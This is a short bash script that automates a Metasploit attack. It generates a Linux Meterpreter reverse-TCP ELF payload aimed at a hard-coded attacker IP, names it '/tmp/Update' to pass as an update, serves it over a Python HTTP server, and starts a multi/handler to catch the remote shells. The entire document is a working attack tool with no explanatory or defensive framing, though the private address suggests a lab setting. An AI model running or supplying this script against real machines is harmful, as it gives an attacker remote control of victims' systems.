#!/bin/bash

LPORT="5000"
ATTACKER_IP="192.168.152.128"
PAYLOAD="linux/x86/meterpreter/reverse_tcp"
OUTPUT="/tmp/Update"


echo "[*] Generating ELF payload ..."
msfvenom -p $PAYLOAD LHOST=$ATTACKER_IP LPORT=$LPORT PrependFork=true -f elf -o $OUTPUT
if [ $? -eq 0 ]; then
	echo "[+] Payload created: $OUTPUT"
else
	echo "[-] Payload creation failed!"
	exit 1
fi

chmod +x $OUTPUT

echo "[*] Starting HTTP server on port 9000 ..."
cd /tmp
python3 -m http.server 9000 &
HTTP_PID=$!

echo "[*] Starting Metasploit multi/handler ..."
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $ATTACKER_IP; set LPORT $LPORT; set ExitONsession false; exploit -j -z"

kill $HTTP_PID
